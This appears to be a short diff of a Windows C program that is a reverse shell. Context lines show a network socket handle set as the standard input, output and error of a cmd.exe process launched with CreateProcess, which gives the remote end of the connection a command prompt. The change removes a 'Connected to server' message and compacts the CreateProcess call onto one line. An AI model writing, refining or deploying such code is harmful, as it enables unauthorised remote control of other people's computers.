@@ -46,8 +46,6 @@ int main()
         return 1;
     }
 
-    printf("Connected to server\n");
-
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
@@ -55,17 +53,7 @@ int main()
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)ConnectSocket;
 
     wchar_t app[] = L"C:\\WINDOWS\\system32\\cmd.exe";
-    if (!CreateProcess(
-        app,
-		NULL,
-        NULL,
-        NULL,
-        TRUE,
-        0,
-        NULL,
-        NULL,
-        &si,
-        &pi))
+    if (!CreateProcess(app,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si, &pi))
     {
         printf("CreateProcess failed (%d)\n", GetLastError());
         closesocket(ConnectSocket);
